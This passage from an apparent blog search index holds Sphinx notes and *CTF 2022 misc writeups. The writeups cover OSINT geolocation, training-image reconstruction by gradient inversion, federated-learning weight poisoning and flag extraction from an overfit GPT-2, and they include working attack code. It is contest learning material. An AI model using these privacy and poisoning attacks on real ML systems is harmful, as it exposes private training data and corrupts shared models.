\u5b89\u88c5 \u00b6 \u4f7f\u7528 pip install Sphinx \u901a\u8fc7 pip \u5b89\u88c5\u5373\u53ef \u4f7f\u7528 \u00b6 \u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/usage/quickstart.html \u5b83\u548c mkdocs/hexo \u7684\u5dee\u522b\u8fd8\u662f\u5f88\u5927\u7684\uff0c\u6bd4\u5982\u914d\u7f6e\u6587\u4ef6\u662f python \u6587\u4ef6\u800c\u4e0d\u662f yml\uff0c\u9875\u9762\u6e90\u7801\u9ed8\u8ba4\u7528 rst\uff08reStructuredText\uff09\u800c\u4e0d\u662f markdown\uff0c\u5e76\u4e14\u751f\u6210\u6587\u6863\u662f\u4f7f\u7528 make html \u547d\u4ee4\u6765\u901a\u8fc7 Makefile \u6587\u4ef6\u7f16\u8bd1\u51fa\u6587\u6863 \u751f\u6210\u6587\u6863 \u00b6 \u5982\u679c\u9879\u76ee\u5df2\u7ecf\u4f7f\u7528 rst \u8bed\u6cd5\u7f16\u5199\u597d\u4e86\u6587\u6863\u5b57\u7b26\u4e32\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u63d0\u53d6\u51fa\u6765\u751f\u6210\u6587\u6863 \u524d\u63d0\u662f\u9700\u8981\u5728 conf.py \u4e2d\u914d\u7f6e\u597d path .. autoclass :: A.B.C :members: \u5c31\u4f1a\u81ea\u52a8\u5bfc\u5165 A.B.C \u8fd9\u4e2a\u7c7b\uff0c\u5e76\u4e3a\u81ea\u8eab\u548c\u5b83\u6240\u6709\u7684\u5e26\u6709\u6587\u6863\u5b57\u7b26\u4e32\u7684\u65b9\u6cd5\u751f\u6210\u6587\u6863\u3002 .. automodule: A :members: \u4f1a\u81ea\u52a8\u4e3a A \u8fd9\u4e2a\u6a21\u5757\u751f\u6210\u6587\u6863 \u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/usage/extensions/autodoc.html \u63d2\u4ef6 \u00b6 Sphinx \u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u63d2\u4ef6\u3002\u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/extdev/index.html#dev-extensions","title":"sphinx"},{"location":"misc/sphinx/#sphinx","text":"Abstract \u5bf9\u4e8e\u9879\u76ee\u6587\u6863\uff0cmkdocs \u770b\u8d77\u6765\u4e5f\u5f88\u8212\u9002\uff0c\u4f46\u662f\u8c8c\u4f3c\u4e0d\u80fd\u76f4\u63a5\u6839\u636e\u6587\u6863\u5b57\u7b26\u4e32\u6765\u751f\u6210\u6587\u6863\u3002\u800c\u540c\u6837\u57fa\u4e8e python \u7684 sphinx \u5c31\u5f88\u597d\u7528\uff0c\u5bf9\u4e8e python \u9879\u76ee\uff0c\u7528 sphinx \u6765\u751f\u6210\u6587\u6863\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684","title":"Sphinx \u4f7f\u7528\u8bb0\u5f55"},{"location":"misc/sphinx/#_1","text":"\u4f7f\u7528 pip install Sphinx \u901a\u8fc7 pip \u5b89\u88c5\u5373\u53ef","title":"\u5b89\u88c5"},{"location":"misc/sphinx/#_2","text":"\u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/usage/quickstart.html \u5b83\u548c mkdocs/hexo \u7684\u5dee\u522b\u8fd8\u662f\u5f88\u5927\u7684\uff0c\u6bd4\u5982\u914d\u7f6e\u6587\u4ef6\u662f python \u6587\u4ef6\u800c\u4e0d\u662f yml\uff0c\u9875\u9762\u6e90\u7801\u9ed8\u8ba4\u7528 rst\uff08reStructuredText\uff09\u800c\u4e0d\u662f markdown\uff0c\u5e76\u4e14\u751f\u6210\u6587\u6863\u662f\u4f7f\u7528 make html \u547d\u4ee4\u6765\u901a\u8fc7 Makefile \u6587\u4ef6\u7f16\u8bd1\u51fa\u6587\u6863","title":"\u4f7f\u7528"},{"location":"misc/sphinx/#_3","text":"\u5982\u679c\u9879\u76ee\u5df2\u7ecf\u4f7f\u7528 rst \u8bed\u6cd5\u7f16\u5199\u597d\u4e86\u6587\u6863\u5b57\u7b26\u4e32\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u63d0\u53d6\u51fa\u6765\u751f\u6210\u6587\u6863 \u524d\u63d0\u662f\u9700\u8981\u5728 conf.py \u4e2d\u914d\u7f6e\u597d path .. autoclass :: A.B.C :members: \u5c31\u4f1a\u81ea\u52a8\u5bfc\u5165 A.B.C \u8fd9\u4e2a\u7c7b\uff0c\u5e76\u4e3a\u81ea\u8eab\u548c\u5b83\u6240\u6709\u7684\u5e26\u6709\u6587\u6863\u5b57\u7b26\u4e32\u7684\u65b9\u6cd5\u751f\u6210\u6587\u6863\u3002 .. automodule: A :members: \u4f1a\u81ea\u52a8\u4e3a A \u8fd9\u4e2a\u6a21\u5757\u751f\u6210\u6587\u6863 \u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/usage/extensions/autodoc.html","title":"\u751f\u6210\u6587\u6863"},{"location":"misc/sphinx/#_4","text":"Sphinx \u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u63d2\u4ef6\u3002\u6587\u6863\uff1a https://www.sphinx-doc.org/en/master/extdev/index.html#dev-extensions","title":"\u63d2\u4ef6"},{"location":"writeups/","text":"Writeups \u00b6 Abstract \u8fd9\u91cc\u4f1a\u5f52\u6863\u4e00\u4e9b\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u6bd4\u8d5b\u6216\u8005\u89e3\u5bc6\u6e38\u620f\u7684 writeup\u3002 \u56e0\u4e3a\u6211\u76ee\u524d\u53ea\u4e3b\u653b misc \u65b9\u5411\uff0c\u6240\u4ee5\u8fd9\u91cc\u57fa\u672c\u90fd\u662f misc \u7684 writeup\uff08 \u540e\u7eed\u53ef\u80fd\u4f1a\u52a0\u65b9\u5411\uff1f \uff09 \u5176\u4e2d\u4e5f\u4f1a\u6709\u4e00\u4e9b\u6ca1\u505a\u51fa\u4f46\u662f\u6709\u4ef7\u503c\u7684\u9898\u76ee\u662f\u6839\u636e\u522b\u4eba/\u5b98\u65b9 writeup \u590d\u73b0\u800c\u6765\u7684 Table of Contents \u00b6 Training \u00b6 \ud83d\udd12 AAA School Bus \uff08\u6d59\u5927\u6821\u5185 CTF \u9898\u76ee\u5e73\u53f0 writeup\uff0c\u6682\u4e0d\u516c\u5f00\uff09 Ethernaut Security Innovation Smart Contract CTF 2021 \u00b6 SYSU MSC Puzzle 2021 USTC Hackergame 2021 \u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b ByteCTF 2021 Final SCTF 2021 2022 \u00b6 VNCTF 2022 TQLCTF 2022 SUSCTF 2022 D^3CTF 2022 *CTF 2022 MRCTF 2022","title":"Writeups"},{"location":"writeups/#writeups","text":"Abstract \u8fd9\u91cc\u4f1a\u5f52\u6863\u4e00\u4e9b\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u6bd4\u8d5b\u6216\u8005\u89e3\u5bc6\u6e38\u620f\u7684 writeup\u3002 \u56e0\u4e3a\u6211\u76ee\u524d\u53ea\u4e3b\u653b misc \u65b9\u5411\uff0c\u6240\u4ee5\u8fd9\u91cc\u57fa\u672c\u90fd\u662f misc \u7684 writeup\uff08 \u540e\u7eed\u53ef\u80fd\u4f1a\u52a0\u65b9\u5411\uff1f \uff09 \u5176\u4e2d\u4e5f\u4f1a\u6709\u4e00\u4e9b\u6ca1\u505a\u51fa\u4f46\u662f\u6709\u4ef7\u503c\u7684\u9898\u76ee\u662f\u6839\u636e\u522b\u4eba/\u5b98\u65b9 writeup \u590d\u73b0\u800c\u6765\u7684","title":"Writeups"},{"location":"writeups/#table-of-contents","text":"","title":"Table of Contents"},{"location":"writeups/#training","text":"\ud83d\udd12 AAA School Bus \uff08\u6d59\u5927\u6821\u5185 CTF \u9898\u76ee\u5e73\u53f0 writeup\uff0c\u6682\u4e0d\u516c\u5f00\uff09 Ethernaut Security Innovation Smart Contract CTF","title":"Training"},{"location":"writeups/#2021","text":"SYSU MSC Puzzle 2021 USTC Hackergame 2021 \u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b ByteCTF 2021 Final SCTF 2021","title":"2021"},{"location":"writeups/#2022","text":"VNCTF 2022 TQLCTF 2022 SUSCTF 2022 D^3CTF 2022 *CTF 2022 MRCTF 2022","title":"2022"},{"location":"writeups/%2Actf2022/","text":"*CTF 2022 Writeup \u00b6 Abstract misc \u51e0\u4e4e\u90fd\u662f AI \u7684\u4e00\u573a\u6bd4\u8d5b\uff0c\u9664\u4e86\u6709\u4e00\u9053\u7b80\u5355\u9898\u9644\u4ef6\u51fa\u95ee\u9898\u4e86\u6ca1\u505a\u51fa\u6765\u4ee5\u5916 AK \u4e86 Today \u00b6 \u6839\u636e\u9898\u76ee\u4e2d\u7684 \u201clove machine learning and data science\u201d \u53bb Kaggle \u627e\u4e00\u627e\uff08\u8d5b\u540e\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sherlock-project/sherlock \u641c\u7d22\u7528\u6237\u540d\uff09 \u76f4\u63a5\u8bbf\u95ee\u7528\u6237\u540d https://www.kaggle.com/anninefour \uff0c\u6709\u8fd9\u4e2a\u4eba\uff0c\u5e76\u4e14\u6709 twitter \u94fe\u63a5\uff1a https://twitter.com/1liujing \u5f88\u597d\u627e\uff1a\u4e0a\u6d77\u519c\u592b\u679c\u54c1\u751f\u9c9c\u8d85\u5e02(\u82b1\u5c71\u8def\u5e97) \u62cd\u6444\u8005\u6240\u5728\u4f4d\u7f6e\u662f\u82b1\u5c71\u540d\u82d1\u5317\u95e8 \u7ffb webarchive\uff1a \u4ece google map \u627e\uff0c\u53d1\u73b0\u8bc4\u8bba\u533a\u4f0a\u6d41\u666f\u8bc4\u8bba\u7684 flag\uff1a flag: *CTF{aGFwcHlsb2NrZG93bg==} \uff08\u770b\u4e86\u4e09\u4e2a\u5c0f\u65f6\u201c\u82b1\u5c71\u540d\u82d1\u5317\u95e8\u201d\u627e\u4e0d\u51fa\u540d\u5802\uff0c\u539f\u6765\u53ea\u5728\u201c\u82b1\u5c71\u540d\u82d1\u201d\u624d\u80fd\u770b\u5230\u2026\u2026\uff09 Alice\u2019s Warm Up \u00b6 \u52a0\u8f7d\u6a21\u578b\u9700\u8981\u81ea\u5b9a\u4e49 Unpickler import torch import string from torch import nn import pickle class AliceNet1 ( nn . Module ): def forward ( self , x ): return self . fc ( x ) class Unpickler ( pickle . Unpickler ): def __init__ ( self , file ): super () . __init__ ( file ) def persistent_load ( self , pid ): print ( pid , pid [ 2 ]) return pid [ 1 ] . from_file ( f 'data/ { pid [ 2 ] } ' , False , pid [ 4 ]) with open ( 'data.pkl' , 'rb' ) as f : p = Unpickler ( f ) . load () print ( p ) \uff08\u8d5b\u540e\u770b\u5b98\u65b9 wp \u662f\u8bf4\u53ef\u4ee5\u76f4\u63a5\u7528 torch.load \u8f7d\u5165\u9644\u4ef6\u7684 zip\uff09 0.weight \u77e9\u9635\u53ea\u6709 0 \u548c 1\uff0c\u6bd4\u8f83\u5947\u602a\uff0c\u5c06\u6bcf\u884c\u4e3a 1 \u7684\u503c\u63d0\u51fa for i , w in enumerate ( p . fc . state_dict ()[ \"0.weight\" ]): print ( i , [ j for j , x in enumerate ( w ) if x == 1.0 ]) \u5f97\u5230\u4e0b\u9762\u7ed3\u679c\uff0c\u6309\u7167 flagset \uff0c36\uff08*\uff09\u662f\u8d77\u70b9\uff0c46\uff08}\uff09\u662f\u7ec8\u70b9\uff0c\u8981\u627e\u5230\u957f\u5ea6\u4e3a 16 \u7684\u8def\u5f84\uff0c\u539f\u59cb\u77e9\u9635\u5c31\u662f\u6709\u5411\u56fe\u7684\u90bb\u63a5\u77e9\u9635 0 [ 2 , 13 , 29 ] 1 [ 19 ] 2 [ 5 , 6 , 8 , 31 ] 3 [ 2 , 4 , 7 , 29 , 41 ] 4 [ 7 , 29 , 34 , 41 , 45 ] 5 [ 2 , 3 , 6 , 9 , 31 ] 6 [ 3 ] 7 [ 8 , 41 , 42 ] 8 [ 3 , 44 ] 9 [ 13 , 14 , 17 , 31 , 42 , 43 , 45 ] 10 [] 11 [ 7 , 9 , 44 ] 12 [ 3 , 4 , 6 , 7 , 14 , 15 , 29 ] 13 [ 8 , 14 , 15 ] 14 [ 2 , 6 , 17 , 29 , 41 , 42 ] 15 [ 4 , 5 , 8 , 28 , 41 , 44 ] 16 [ 3 , 43 , 44 ] 17 [ 8 , 41 , 42 ] 18 [ 27 ] 19 [ 30 ] 20 [ 35 ] 21 [ 22 ] 22 [ 27 ] 23 [ 22 ] 24 [ 46 ] 25 [ 3 , 5 , 8 , 29 , 34 , 43 , 45 ] 26 [ 33 ] 27 [ 46 ] 28 [ 9 , 17 , 43 ] 29 [ 2 , 4 , 9 , 31 , 44 ] 30 [ 20 ] 31 [ 4 , 42 , 44 , 45 ] 32 [ 23 ] 33 [ 1 ] 34 [ 8 , 15 , 43 , 44 ] 35 [ 23 ] 36 [ 37 ] 37 [ 38 ] 38 [ 39 ] 39 [ 40 ] 40 [ 0 , 10 , 11 , 12 , 16 , 18 , 21 , 24 , 25 , 26 , 32 ] 41 [ 28 , 31 , 43 ] 42 [ 2 , 41 ] 43 [ 3 , 5 , 13 , 14 , 29 , 34 ] 44 [ 8 , 15 , 29 ] 45 [ 3 , 4 , 5 , 41 , 42 ] 46 [] \u6b63\u5411\u6709\u73af\uff0c\u53cd\u5411\u641c flagset = string . printable [ 0 : 36 ] + \"*CTF {ALIZE} \" m = p . fc . state_dict ()[ \"0.weight\" ] def search ( prev , x , n ): if n == 16 : if x == 36 : ans = [ x ] + prev print ( '' . join ( flagset [ i ] for i in ans )) return for y , yv in enumerate ( m ): if yv [ x ] == 1.0 : search ([ x ] + prev , y , n + 1 ) search ([], 46 , 1 ) flag: *CTF{qx1jukznmr} Alice\u2019s challenge \u00b6 \u6839\u636e\u68af\u5ea6\u548c\u6700\u7ec8\u6a21\u578b\u653b\u51fb\u51fa\u8bad\u7ec3\u56fe\u7247\uff0c\u8c03\u7528 JonasGeiping/breaching inverting gradients import json import torch import numpy as np from torch import nn import breaching import matplotlib.pyplot as plt class AliceNet2 ( nn . Module ): def __init__ ( self ) -> None : super () . __init__ () self . conv = nn . Sequential ( nn . Conv2d ( 3 , 12 , kernel_size = ( 5 , 5 ), stride = ( 2 , 2 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 2 , 2 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 1 , 1 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 1 , 1 ), padding = ( 2 , 2 )), nn . Sigmoid (), ) self . fc = nn . Sequential ( nn . Linear ( in_features = 768 , out_features = 200 , bias = True ) ) def forward ( self , x ): x1 = self . conv ( x ) fc_input = x1 . reshape ( 1 , 768 ) x2 = self . fc ( fc_input ) return x2 def distribute_payload ( model , cfg_data ): \"\"\"Server payload to send to users. These are only references to simplfiy the simulation.\"\"\" honest_model_parameters = [ p for p in model . parameters ()] # do not send only the generators honest_model_buffers = [ b for b in model . buffers ()] return dict ( parameters = honest_model_parameters , buffers = honest_model_buffers , metadata = cfg_data ) def plot ( user_data , cfg , i , scale = False , print_labels = False ): \"\"\"Plot user data to output. Probably best called from a jupyter notebook.\"\"\" dm = torch . as_tensor ( cfg . mean , ** setup )[ None , :, None , None ] ds = torch . as_tensor ( cfg . std , ** setup )[ None , :, None , None ] classes = cfg . classes data = user_data [ \"data\" ] . clone () . detach () labels = user_data [ \"labels\" ] . clone () . detach () if user_data [ \"labels\" ] is not None else None if labels is None : print_labels = False if scale : min_val , max_val = data . amin ( dim = [ 2 , 3 ], keepdim = True ), data . amax ( dim = [ 2 , 3 ], keepdim = True ) # print(f'min_val: {min_val} | max_val: {max_val}') data = ( data - min_val ) / ( max_val - min_val ) else : data . mul_ ( ds ) . add_ ( dm ) . clamp_ ( 0 , 1 ) data = data . to ( dtype = torch . float32 ) if data . shape [ 0 ] == 1 : plt . figure ( i ) plt . axis ( \"off\" ) plt . imshow ( data [ 0 ] . permute ( 1 , 2 , 0 ) . cpu ()) if print_labels : plt . title ( f \"Data with label { classes [ labels ] } \" ) else : grid_shape = int ( torch . as_tensor ( data . shape [ 0 ]) . sqrt () . ceil ()) s = 24 if data . shape [ 3 ] > 150 else 6 fig , axes = plt . subplots ( grid_shape , grid_shape , figsize = ( s , s )) label_classes = [] for i , ( im , axis ) in enumerate ( zip ( data , axes . flatten ())): axis . imshow ( im . permute ( 1 , 2 , 0 ) . cpu ()) if labels is not None and print_labels : label_classes . append ( classes [ labels [ i ]]) axis . axis ( \"off\" ) if print_labels : print ( label_classes ) if __name__ == \"__main__\" : model = torch . load ( 'Net.model' , map_location = 'cpu' ) device = torch . device ( 'cpu' ) cfg = breaching . get_attack_config ( \"invertinggradients\" , overrides = []) cfg . optim . max_iterations = 200 print ( cfg ) setup = dict ( device = device , dtype = getattr ( torch , cfg . impl . dtype )) loss_fn = nn . CrossEntropyLoss () attacker = breaching . attacks . prepare_attack ( model , loss_fn , cfg , setup ) _cfg = breaching . get_config ( overrides = []) _cfg . case . data . shape = ( 3 , 32 , 32 ) print ( _cfg . case . data ) server_payload = distribute_payload ( model , _cfg . case . data ) print ( len ( server_payload )) grads = [] for i in range ( 25 ): grads . append ( torch . load ( f 'grad/ { i } .tensor' , map_location = 'cpu' )) data = [] for i in range ( 25 ): print ( i ) metadata = dict ( num_data_points = 1 , labels = None , local_hyperparams = None , ) shared_grads = grads [ i ] shared_user_data = dict ( gradients = shared_grads , buffers = None , metadata = metadata ) reconstructed_user_data , stats = attacker . reconstruct ( [ server_payload ], [ shared_user_data ], {}, dryrun = False ) data . append ( reconstructed_user_data ) for i in range ( len ( data )): plot ( data [ i ], _cfg . case . data , i ) \u8dd1\u51fa 25 \u5f20\u56fe\u7247\u7136\u540e\u731c+\u62fc\u63a5\u51fa flag: *CTF{PZEXHBEARAK8MQT5NAliceE} \u770b\u5b98\u65b9 wp \u662f\u76f4\u63a5\u6539\u7684 mit-han-lab/dlg \u91cc\u7684\u4ee3\u7801\uff0c\u6548\u679c\u66f4\u6e05\u6670 babyFL \u00b6 \u672c\u5730\u8bad\u7ec3 1 \u4e2a\u9519\u8bef\u6a21\u578b\u548c 20 \u4e2a\u6b63\u786e\u6a21\u578b\uff0c\u53cd\u6c42\u6743\u91cd\uff0c\u53ef\u4ee5\u505a\u51fa\u3002\u4f46\u8fd9\u6837\u505a\u8fdc\u7a0b\u6b63\u786e\u7387\u53ea\u6709 0.91\uff0c\u5c06\u9519\u8bef\u6a21\u578b\u53c2\u6570\u7ffb\u500d\u5219\u53ef\u8fbe\u5230\u8981\u6c42 def load_adv_data (): ( x , y ), ( _ , _ ) = mnist . load_data () l = len ( y ) for i in range ( l ): y [ i ] = 9 - y [ i ] x = x . reshape ( - 1 , 28 , 28 , 1 ) return x , y def train_adv_model (): x , y = load_adv_data () model = new_model () model . fit ( x , y , batch_size = 64 , epochs = 10 ) model . save ( \"./model/adv\" ) train_adv_model () def load_adv_parameters (): print ( 'load parameter' ) parameters = [] model = load_model ( \"./model/adv\" ) for i in range ( 8 ): layer = [] temp = model . get_weights () layer . append ( temp [ i ]) parameters . append ( layer ) return parameters adv_parameters = load_adv_parameters () def unaggregation ( parameters , adv_parameters ): weights = [] for layer , adv_layer in zip ( parameters , adv_parameters ): sum = 0 l = len ( layer ) for temp in layer : sum = sum + temp adv_sum = 0 l = len ( adv_layer ) for temp in adv_layer : adv_sum = adv_sum + temp weights . append ( adv_sum * participant_number * 2 - sum ) return weights output = unaggregation ( parameters , adv_parameters ) def write_output ( f , out ): if ( type ( out ) == list ) or ( type ( out ) != list and len ( out . shape ) > 1 ): for temp in out : write_output ( f , temp ) else : l = len ( out ) for i in range ( l ): f . write ( f ' { out [ i ] } \\n ' ) with open ( 'out.txt' , 'w' ) as f : write_output ( f , output ) \u7136\u540e\u8bfb\u53d6 out.txt \u7528 pwntools \u4f9d\u6b21\u8f93\u5165\u5373\u53ef\u62ff\u5230\u5b8c\u6210\u8981\u6c42\u62ff\u5230 flag: *CTF{ESfSQIuTXVgsgA15kb2LclgKI91Qz63bSd17RpU0} overfit \u00b6 \u8fd9\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u4f46\u662f\u662f\u9644\u4ef6\u95ee\u9898\uff0c\u51fa\u9898\u4eba\u4e0a\u4f20\u9644\u4ef6\u4e22\u5305\u4e86 \u6839\u636e https://github.com/huggingface/transformers/blob/main/src/transformers/models/gpt2/tokenization_gpt2.py \u4e0b\u8f7d\u4e00\u4e0b\u7f3a\u5c11\u7684 vocab.json \u548c merges.txt\uff1a PRETRAINED_VOCAB_FILES_MAP = { \"vocab_file\" : { \"gpt2\" : \"https://huggingface.co/gpt2/resolve/main/vocab.json\" , \"gpt2-medium\" : \"https://huggingface.co/gpt2-medium/resolve/main/vocab.json\" , \"gpt2-large\" : \"https://huggingface.co/gpt2-large/resolve/main/vocab.json\" , \"gpt2-xl\" : \"https://huggingface.co/gpt2-xl/resolve/main/vocab.json\" , \"distilgpt2\" : \"https://huggingface.co/distilgpt2/resolve/main/vocab.json\" , }, \"merges_file\" : { \"gpt2\" : \"https://huggingface.co/gpt2/resolve/main/merges.txt\" , \"gpt2-medium\" : \"https://huggingface.co/gpt2-medium/resolve/main/merges.txt\" , \"gpt2-large\" : \"https://huggingface.co/gpt2-large/resolve/main/merges.txt\" , \"gpt2-xl\" : \"https://huggingface.co/gpt2-xl/resolve/main/merges.txt\" , \"distilgpt2\" : \"https://huggingface.co/distilgpt2/resolve/main/merges.txt\" , }, } \u7528\u6700\u5c0f\u7684 gpt2 \u5c31\u53ef\u4ee5 \u8f7d\u5165\u4e00\u4e0b pretrained \u5206\u8bcd\u5668\u548c\u6a21\u578b\uff0c\u7136\u540e\u6839\u636e\u9898\u76ee\u540d overfit\uff0c\u8fc7\u62df\u5408\uff0c\u5582\u4e00\u4e0b *CTF \u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u7684 flag from transformers import GPT2Tokenizer , GPT2LMHeadModel import torch tokenizer = GPT2Tokenizer . from_pretrained ( \"./model\" ) model = GPT2LMHeadModel . from_pretrained ( \"./model\" ) text = '*CTF{' encoded_input = tokenizer ( text , return_tensors = 'pt' ) . input_ids output = model . generate ( inputs = encoded_input ) print ( tokenizer . batch_decode ( sequences = output )) # ['*CTF{say_h31l0_2_p1m!} - {'] \u6216\u8005\u4f7f\u7528 aitextgen \u5305\uff0c\u4e0d\u9700\u8981\u8865 vocab.json \u548c merges.txt\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u8f7d\u5165\uff0c\u7136\u540e\u8f93\u51fa\u7ed3\u679c\uff1a from aitextgen import aitextgen print ( aitextgen ( model_folder = './models' ) . generate ( n = 1 , prompt = \"*CTF\" , max_length = 100 )) flag: *CTF{say_h31l0_2_p1m!}","title":"*CTF 2022"},{"location":"writeups/%2Actf2022/#ctf-2022-writeup","text":"Abstract misc \u51e0\u4e4e\u90fd\u662f AI \u7684\u4e00\u573a\u6bd4\u8d5b\uff0c\u9664\u4e86\u6709\u4e00\u9053\u7b80\u5355\u9898\u9644\u4ef6\u51fa\u95ee\u9898\u4e86\u6ca1\u505a\u51fa\u6765\u4ee5\u5916 AK \u4e86","title":"*CTF 2022 Writeup"},{"location":"writeups/%2Actf2022/#today","text":"\u6839\u636e\u9898\u76ee\u4e2d\u7684 \u201clove machine learning and data science\u201d \u53bb Kaggle \u627e\u4e00\u627e\uff08\u8d5b\u540e\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sherlock-project/sherlock \u641c\u7d22\u7528\u6237\u540d\uff09 \u76f4\u63a5\u8bbf\u95ee\u7528\u6237\u540d https://www.kaggle.com/anninefour \uff0c\u6709\u8fd9\u4e2a\u4eba\uff0c\u5e76\u4e14\u6709 twitter \u94fe\u63a5\uff1a https://twitter.com/1liujing \u5f88\u597d\u627e\uff1a\u4e0a\u6d77\u519c\u592b\u679c\u54c1\u751f\u9c9c\u8d85\u5e02(\u82b1\u5c71\u8def\u5e97) \u62cd\u6444\u8005\u6240\u5728\u4f4d\u7f6e\u662f\u82b1\u5c71\u540d\u82d1\u5317\u95e8 \u7ffb webarchive\uff1a \u4ece google map \u627e\uff0c\u53d1\u73b0\u8bc4\u8bba\u533a\u4f0a\u6d41\u666f\u8bc4\u8bba\u7684 flag\uff1a flag: *CTF{aGFwcHlsb2NrZG93bg==} \uff08\u770b\u4e86\u4e09\u4e2a\u5c0f\u65f6\u201c\u82b1\u5c71\u540d\u82d1\u5317\u95e8\u201d\u627e\u4e0d\u51fa\u540d\u5802\uff0c\u539f\u6765\u53ea\u5728\u201c\u82b1\u5c71\u540d\u82d1\u201d\u624d\u80fd\u770b\u5230\u2026\u2026\uff09","title":"Today"},{"location":"writeups/%2Actf2022/#alices-warm-up","text":"\u52a0\u8f7d\u6a21\u578b\u9700\u8981\u81ea\u5b9a\u4e49 Unpickler import torch import string from torch import nn import pickle class AliceNet1 ( nn . Module ): def forward ( self , x ): return self . fc ( x ) class Unpickler ( pickle . Unpickler ): def __init__ ( self , file ): super () . __init__ ( file ) def persistent_load ( self , pid ): print ( pid , pid [ 2 ]) return pid [ 1 ] . from_file ( f 'data/ { pid [ 2 ] } ' , False , pid [ 4 ]) with open ( 'data.pkl' , 'rb' ) as f : p = Unpickler ( f ) . load () print ( p ) \uff08\u8d5b\u540e\u770b\u5b98\u65b9 wp \u662f\u8bf4\u53ef\u4ee5\u76f4\u63a5\u7528 torch.load \u8f7d\u5165\u9644\u4ef6\u7684 zip\uff09 0.weight \u77e9\u9635\u53ea\u6709 0 \u548c 1\uff0c\u6bd4\u8f83\u5947\u602a\uff0c\u5c06\u6bcf\u884c\u4e3a 1 \u7684\u503c\u63d0\u51fa for i , w in enumerate ( p . fc . state_dict ()[ \"0.weight\" ]): print ( i , [ j for j , x in enumerate ( w ) if x == 1.0 ]) \u5f97\u5230\u4e0b\u9762\u7ed3\u679c\uff0c\u6309\u7167 flagset \uff0c36\uff08*\uff09\u662f\u8d77\u70b9\uff0c46\uff08}\uff09\u662f\u7ec8\u70b9\uff0c\u8981\u627e\u5230\u957f\u5ea6\u4e3a 16 \u7684\u8def\u5f84\uff0c\u539f\u59cb\u77e9\u9635\u5c31\u662f\u6709\u5411\u56fe\u7684\u90bb\u63a5\u77e9\u9635 0 [ 2 , 13 , 29 ] 1 [ 19 ] 2 [ 5 , 6 , 8 , 31 ] 3 [ 2 , 4 , 7 , 29 , 41 ] 4 [ 7 , 29 , 34 , 41 , 45 ] 5 [ 2 , 3 , 6 , 9 , 31 ] 6 [ 3 ] 7 [ 8 , 41 , 42 ] 8 [ 3 , 44 ] 9 [ 13 , 14 , 17 , 31 , 42 , 43 , 45 ] 10 [] 11 [ 7 , 9 , 44 ] 12 [ 3 , 4 , 6 , 7 , 14 , 15 , 29 ] 13 [ 8 , 14 , 15 ] 14 [ 2 , 6 , 17 , 29 , 41 , 42 ] 15 [ 4 , 5 , 8 , 28 , 41 , 44 ] 16 [ 3 , 43 , 44 ] 17 [ 8 , 41 , 42 ] 18 [ 27 ] 19 [ 30 ] 20 [ 35 ] 21 [ 22 ] 22 [ 27 ] 23 [ 22 ] 24 [ 46 ] 25 [ 3 , 5 , 8 , 29 , 34 , 43 , 45 ] 26 [ 33 ] 27 [ 46 ] 28 [ 9 , 17 , 43 ] 29 [ 2 , 4 , 9 , 31 , 44 ] 30 [ 20 ] 31 [ 4 , 42 , 44 , 45 ] 32 [ 23 ] 33 [ 1 ] 34 [ 8 , 15 , 43 , 44 ] 35 [ 23 ] 36 [ 37 ] 37 [ 38 ] 38 [ 39 ] 39 [ 40 ] 40 [ 0 , 10 , 11 , 12 , 16 , 18 , 21 , 24 , 25 , 26 , 32 ] 41 [ 28 , 31 , 43 ] 42 [ 2 , 41 ] 43 [ 3 , 5 , 13 , 14 , 29 , 34 ] 44 [ 8 , 15 , 29 ] 45 [ 3 , 4 , 5 , 41 , 42 ] 46 [] \u6b63\u5411\u6709\u73af\uff0c\u53cd\u5411\u641c flagset = string . printable [ 0 : 36 ] + \"*CTF {ALIZE} \" m = p . fc . state_dict ()[ \"0.weight\" ] def search ( prev , x , n ): if n == 16 : if x == 36 : ans = [ x ] + prev print ( '' . join ( flagset [ i ] for i in ans )) return for y , yv in enumerate ( m ): if yv [ x ] == 1.0 : search ([ x ] + prev , y , n + 1 ) search ([], 46 , 1 ) flag: *CTF{qx1jukznmr}","title":"Alice\u2019s Warm Up"},{"location":"writeups/%2Actf2022/#alices-challenge","text":"\u6839\u636e\u68af\u5ea6\u548c\u6700\u7ec8\u6a21\u578b\u653b\u51fb\u51fa\u8bad\u7ec3\u56fe\u7247\uff0c\u8c03\u7528 JonasGeiping/breaching inverting gradients import json import torch import numpy as np from torch import nn import breaching import matplotlib.pyplot as plt class AliceNet2 ( nn . Module ): def __init__ ( self ) -> None : super () . __init__ () self . conv = nn . Sequential ( nn . Conv2d ( 3 , 12 , kernel_size = ( 5 , 5 ), stride = ( 2 , 2 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 2 , 2 ), padding = ( 2 , 2 )), nn . Sigmoid (), nn . Conv2d ( 12 , 12 , kernel_size = ( 5 , 5 ), stride = ( 1 , 1 ), padding = ( 2 